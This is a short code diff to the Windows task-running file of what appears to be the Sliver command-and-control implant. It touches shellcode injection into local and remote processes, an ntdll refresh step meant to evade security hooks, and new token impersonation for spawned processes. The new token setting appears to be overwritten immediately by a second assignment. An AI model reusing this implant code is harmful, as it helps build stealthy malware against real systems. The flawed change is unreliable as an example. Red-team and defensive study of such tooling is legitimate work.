@@ -31,11 +31,13 @@ import (
 	"strings"
 	"time"
 	"unsafe"
+	"runtime"
 
 	"golang.org/x/sys/windows"
 	"github.com/bishopfox/sliver/sliver/version"
 	"github.com/bishopfox/sliver/sliver/syscalls"
 	"github.com/bishopfox/sliver/sliver/evasion"
+	"syscall"
 )
 
 const (
@@ -48,6 +50,7 @@ const (
 var (
 	ntdllPath       = "C:\\Windows\\System32\\ntdll.dll" // We make this a var so the string obfuscator can refactor it
 	kernel32dllPath = "C:\\Windows\\System32\\kernel32.dll"
+	CurrentToken windows.Token
 )
 
 func sysAlloc(size int, rwxPages bool) (uintptr, error) {
@@ -149,9 +152,12 @@ func RemoteTask(processID int, data []byte, rwxPages bool) error {
 }
 
 func LocalTask(data []byte, rwxPages bool) error {
-	err := refresh()
-	if err != nil {
-		return err
+	var err error
+	if runtime.GOARCH == "amd64" {
+		err = refresh()
+		if err != nil {
+			return err
+		}
 	}
 	size := len(data)
 	addr, _ := sysAlloc(size, rwxPages)
@@ -328,6 +334,9 @@ func refresh() error {
 
 func startProcess(proc string, stdout *bytes.Buffer, stderr *bytes.Buffer) (*exec.Cmd, error) {
 	cmd := exec.Command(proc)
+	cmd.SysProcAttr = &windows.SysProcAttr{
+		Token: syscall.Token(CurrentToken),
+	}
 	cmd.Stdout = stdout
 	cmd.Stderr = stderr
 	cmd.SysProcAttr = &windows.SysProcAttr{
